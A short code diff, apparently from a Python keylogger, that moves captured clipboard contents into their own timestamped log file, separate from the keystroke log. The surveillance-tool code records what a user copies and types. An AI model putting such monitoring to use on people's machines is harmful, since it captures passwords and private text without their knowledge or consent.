@@ -5,6 +5,7 @@ import time
 import threading
 
 logFile = "log.txt"
+clipboardLogFile = "clipboard.txt"
 
 # Dictionary of special keys that are converted to labels for easier readability in log file
 mappedKeys = {
@@ -52,7 +53,7 @@ def clipboard_monitoring():
             if current_clipboard != clipboard:
                 clipboard = current_clipboard
                 timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                with open(logFile, "a") as file:
+                with open(clipboardLogFile, "a") as file:
                     file.write(f"[{timestamp}] [Clipboard] {clipboard}\n")
         except Exception:
             pass
